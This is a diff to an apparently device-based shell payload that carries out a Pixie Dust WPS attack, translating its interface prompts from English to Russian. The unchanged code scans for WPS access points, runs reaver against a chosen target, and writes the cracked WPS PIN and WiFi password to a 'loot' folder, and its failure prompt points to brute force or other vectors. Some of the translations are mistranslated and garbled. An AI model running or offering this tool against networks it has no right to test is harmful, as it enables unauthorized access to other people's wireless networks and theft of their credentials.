@@ -12,14 +12,14 @@ nullsec_require_iface || exit 1
 LOOT_DIR="/mmc/nullsec/loot"
 mkdir -p "$LOOT_DIR"
 
-PROMPT "PIXIE DUST ATTACK
+PROMPT "АТАКА PIXIE DUST
 ━━━━━━━━━━━━━━━━━━━━━━━━━
-Offline WPS PIN attack.
-Exploits weak random
-number generation in
-WPS implementations.
+Оффлайн-атака WPS PIN.
+Освобождает слабое
+генерирование случайных чисел
+в WPS реализациях.
 
-Press OK to scan."
+Нажмите OK для сканирования."
 
 MONITOR_IF=""
 for iface in wlan1mon wlan2mon wlan1 $IFACE; do
@@ -28,11 +28,11 @@ done
 [ -z "$MONITOR_IF" ] && ERROR_DIALOG "Интерфейс WiFi не найден!" && exit 1
 
 if ! which reaver >/dev/null 2>&1; then
-    ERROR_DIALOG "reaver не найден!\nInstall: opkg install reaver"
+    ERROR_DIALOG "reaver не найден!\nУстановите: opkg install reaver"
     exit 1
 fi
 
-SPINNER_START "Scanning WPS targets..."
+SPINNER_START "Сканирование целей WPS..."
 rm -f /tmp/wps_scan*
 timeout 15 wash -i "$MONITOR_IF" -o /tmp/wps_targets.txt 2>/dev/null &
 sleep 15
@@ -51,22 +51,22 @@ while read -r bssid channel rssi wps_ver wps_locked essid; do
     [ $idx -ge 8 ] && break
 done < /tmp/wps_targets.txt
 
-[ $idx -eq 0 ] && ERROR_DIALOG "No WPS targets found!" && exit 1
+[ $idx -eq 0 ] && ERROR_DIALOG "Цели WPS не найдены!" && exit 1
 
-PROMPT "WPS Targets: $idx
+PROMPT "WPS-цели: $idx
 
 $(for i in $(seq 0 $((idx-1))); do echo "$((i+1)). ${NAMES[$i]}"; done)"
 
-SEL=$(NUMBER_PICKER "Target (1-$idx):" 1)
+SEL=$(NUMBER_PICKER "Цель (1-$idx):" 1)
 case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 1 ;; esac
 SEL=$((SEL - 1))
 [ $SEL -lt 0 ] && SEL=0
 [ $SEL -ge $idx ] && SEL=$((idx - 1))
 
-resp=$(CONFIRMATION_DIALOG "Pixie Dust on:\n${NAMES[$SEL]}\n\nAttempt offline attack?")
+resp=$(CONFIRMATION_DIALOG "Атака Pixie Dust на:\n${NAMES[$SEL]}\n\nПопытаться бесшумных атак?")
 [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0
 
-SPINNER_START "Running Pixie Dust..."
+SPINNER_START "Запуск Pixie Dust..."
 RESULT=$(timeout 120 reaver -i "$MONITOR_IF" -b "${BSSIDS[$SEL]}" -c "${CHANS[$SEL]}" -K 1 -vv 2>&1)
 SPINNER_STOP
 
@@ -77,19 +77,19 @@ if [ -n "$PIN" ]; then
     echo "SSID: ${NAMES[$SEL]}" > "$LOOT_DIR/pixiedust_${NAMES[$SEL]}_$(date +%s).txt"
     echo "PIN: $PIN" >> "$LOOT_DIR/pixiedust_${NAMES[$SEL]}_$(date +%s).txt"
     echo "PSK: $PSK" >> "$LOOT_DIR/pixiedust_${NAMES[$SEL]}_$(date +%s).txt"
-    PROMPT "PIXIE DUST SUCCESS!
+    PROMPT "ПИКСИ ДУСТ - УСПЕХ!
 ━━━━━━━━━━━━━━━━━━━━━━━━━
 SSID: ${NAMES[$SEL]}
 PIN:  $PIN
 PSK:  $PSK
 
-Saved to loot dir."
+Сохранено в лутные файлы."
 else
-    PROMPT "PIXIE DUST FAILED
+    PROMPT "ПИКСИ ДУСТ - ОШИБКА
 ━━━━━━━━━━━━━━━━━━━━━━━━━
-Target not vulnerable
-to Pixie Dust.
+Цель не уязвима
+для Pixie Dust.
 
-Try brute force or
-other attack vector."
+Попытайте brute force
+или другой вектор."
 fi
